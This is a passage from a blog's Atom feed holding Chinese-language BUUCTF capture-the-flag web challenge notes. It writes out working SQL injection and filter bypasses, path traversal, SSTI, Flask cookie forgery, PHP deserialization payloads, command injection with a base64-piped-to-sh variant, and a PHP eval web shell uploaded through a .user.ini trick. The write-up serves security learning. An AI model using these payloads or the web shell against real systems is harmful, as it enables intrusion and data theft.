<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mugen</title>
  
  <subtitle>lego&#39;s blog</subtitle>
  <link href="https://legoc.github.io/atom.xml" rel="self"/>
  
  <link href="https://legoc.github.io/"/>
  <updated>2020-09-08T07:43:05.800Z</updated>
  <id>https://legoc.github.io/</id>
  
  <author>
    <name>lego</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF刷题笔记</title>
    <link href="https://legoc.github.io/2020/07/09/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <id>https://legoc.github.io/2020/07/09/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-09T05:10:19.000Z</published>
    <updated>2020-09-08T07:43:05.800Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题做个笔记来</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>这是一道代码审计题目</p><p>将?二次url编码获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXX/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>先测试是盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and 1=1 #     1&apos; and 1=2 #</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;  order by 1,2,3 #</span><br></pre></td></tr></table></figure><p>发现报错，说明是两列</p><p>尝试联合注入，提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>尝试堆叠注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;show tables#</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200709134218820.png" alt="image-20200709134218820"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;show columns from `1919810931114514`#</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200709202139884.png" alt="image-20200709202139884"></p><p>可以用mysql 预定义语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ;select flag from `1919810931114514`#</span><br><span class="line">对于hex编码为</span><br><span class="line">0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460</span><br><span class="line">最终payload</span><br><span class="line">1;Set @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;Prepare exesql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><p>还有一种方法就是改表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename tables `words` to `test`;rename tables `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><p>然后在1’ or 1=1#</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200711065127602.png" alt="image-20200711065127602"></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>这题的原语句是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_POST[query] || flag from flag</span><br></pre></td></tr></table></figure><p>这题以前做的时候知道有非预期解，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>在数据库里面就是这样的</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200712074227998.png" alt="image-20200712074227998"></p><p>预期解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set sql_mode=pipes_as_concat</span><br></pre></td></tr></table></figure><p>用这个语句把<code>||</code>变成连接符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p>然后再select 1的时候就会查到数据了</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200712075657809.png" alt="image-20200712075657809"></p><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这个是一个登入框，万能密码可以得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1=1#  (url里面注意把#编码成%23)</span><br></pre></td></tr></table></figure><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>ssti模板注入msg参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; handler.settings &#125;&#125;</span><br></pre></td></tr></table></figure><p>访问flag.txt提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure><p>hint为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>得到cookie_secret为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">82624e38-0ada-4948-aefc-9ea3a910a465</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">82624e38-0ada-4948-aefc-9ea3a910a465</span><br><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1   (/fllllllllllllag的md5)   </span><br><span class="line">拼接再做md5</span><br><span class="line">daac3c98830006add152414c80e87f3d</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>查看源码</p><p>发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>输入?cat=dog得到flag</p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>查看源码发现了calc.php源码</p><p>然后访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&apos;num&apos;];</span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>preg_match是一个危险函数，可以引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。（暂时这样理解，因为只看到了/e匹配模式的，不确定/m的是否也是这个样子)</p><p>调用scandir去查看当前路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>发现f1agg文件</p><ul><li>scandir() 函数返回指定目录中的文件和目录的数组</li></ul><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>即读取/f1agg</p><p>得到flag</p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>在跳转页面抓包发现提示secr3t.php</p><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>直接读取发现读不出来，用php伪协议读就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>change页面发现了源码地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure><p>看源码发现是用admin登入就可以拿到flag了</p><ul><li><h4 id="flask-sessions伪造"><a href="#flask-sessions伪造" class="headerlink" title="flask sessions伪造"></a>flask sessions伪造</h4></li></ul><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。</p><p>首先下一个flask工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure><p>SECRET_KEY的值查看源码发现是<code>ckj123</code>，先解码sessions发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py decode -c &quot;.eJw9XXX&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: &apos;e6f667b5f1885ab171fc6ede1b850a0a8ce017af&apos;, u&apos;_fresh&apos;: True, u&apos;user_id&apos;: u&apos;10&apos;, u&apos;name&apos;: u&apos;lego&apos;, u&apos;_id&apos;: &apos;8ac709d0c4ac7bcbf41b5999f303cca0f143f85baff7e24a2aab42f65ad19e1c0cc31b2ad9928b50175aaed34e44e66e225ce828445f5857cb08d1241aca95fe&apos;&#125;</span><br></pre></td></tr></table></figure><p>把name改成admin再编码一下接可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;&#123;xxxxx&#125;&quot;</span><br></pre></td></tr></table></figure><p>然后替换cookie里面的session就可以拿到flag了</p><ul><li><h4 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h4></li></ul><p>nodeprep.prepare函数用的twisted版本是10.2.0的官网最新的是19.2.0，存在一个漏洞，</p><p>这里原理就是利用nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code>。</p><p>所以注册1一个用户名为<code>ᴬdmin</code>的用户，然后重置密码再登入就可以以admin的身份登入得到flag。</p><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>万能密码发现有注入，order by 确定字段为3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=ad1in&apos; union select 1,2,3%23&amp;password=admin</span><br></pre></td></tr></table></figure><p>发现有回显</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200717135753819.png" alt="image-20200717135753819"></p><p>报数据库名为<code>geek</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,database(),3%23&amp;password=admin</span><br></pre></td></tr></table></figure><p>爆表名geekuser,l0ve1ysq1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=admin</span><br></pre></td></tr></table></figure><p>爆列名id,username,password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;l0ve1ysq1&apos;%23&amp;password=admin</span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=ad1in&apos; union select 1,1,group_concat(password) from l0ve1ysq1 %23&amp;password=admin</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag&#123;84424bf6-f114-4a4d-ad7a-1b4b6c3df86c&#125;&apos;</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>打开提示说有备份，访问<a href="http://www.zip下载文件" target="_blank" rel="noopener">www.zip下载文件</a></p><p>关键是反序列化部分代码，查看代码得知</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function __wakeup()&#123;</span><br><span class="line">    $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">    if ($this-&gt;password != 100) &#123;</span><br><span class="line">        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;You name is: &quot;;</span><br><span class="line">        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;You password is: &quot;;</span><br><span class="line">        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">        die();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要两个条件账户admin密码100，在class.php下加上以下POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = new Name(&apos;admin&apos;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p>打印出来的可见字符为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>修改name和加上%00即可得到flag，最终POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>修改为3是为了绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失</p><p>反序列化知识文章：<a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">一文让PHP反序列化从入门到进阶</a></p><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>看题目是一到命令注入的题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>看到有flag.php文件</p><p>直接cat flag被拦截了</p><p>看了一下是空格等一些特殊符号被过滤了,fuzz一下发现下面的符号没被过滤</p><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720111907377.png" alt="image-20200720111907377"></p><p>cat$IFSflag.php发现被过滤了flag字符串</p><p>构造最终pyaload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>或者过滤了bash用sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>或者反引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h3><p>看到一句话直接连上去</p><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>看了一下直接用 php伪协议读就行了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>首先上传一个.user.ini的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>然后构造一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt; @eval($_POST[&apos;pass&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后将两个文件分别上传到服务器上，拿到回显：</p><p>再访问，连接上菜刀得到lflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6ca7562e-3704-4f8c-9ec3-24709b40fd97.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>根据页面提示分别添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720142225713.png" alt="image-20200720142225713"></p><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls /</span><br><span class="line">再</span><br><span class="line">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>测试了一下发现闭合成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=admin&apos;%23&amp;password=123456</span><br></pre></td></tr></table></figure><p>输入下面两个payload根据报错发现过滤了or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=admin&apos; o1r 1=1%23&amp;password=123456</span><br><span class="line">check.php?username=admin&apos; or 1=1%23&amp;password=123456</span><br></pre></td></tr></table></figure><p>使用<code>oorr</code>发现可以bypass</p><p>双写pypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,3%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/BUUCTF刷题笔记/Users\lego\AppData\Roaming\Typora\typora-user-images\image-20200720144618205.png" alt="image-20200720144618205"></p><p>根据规则构造语句爆库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(schema_name) frfromom infoorrmation_schema.schemata</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure><p>发现表有<code>ctf</code>    </p><p>爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://b8cb5268-511b-42fa-86f8-b1d0cd07d936.node3.buuoj.cn/check.php</span><br><span class="line">?username=adm1in&apos; ununionion seselectlect 1,2,</span><br><span class="line">group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&apos;ctf&apos;</span><br><span class="line">%23</span><br><span class="line">&amp;password=123456</span><br></pre></td></tr></table></figure><p>发现有flag列</p><p>直接得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(flag) frfromom ctf.Flag</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table &apos;flag&apos; and the column is 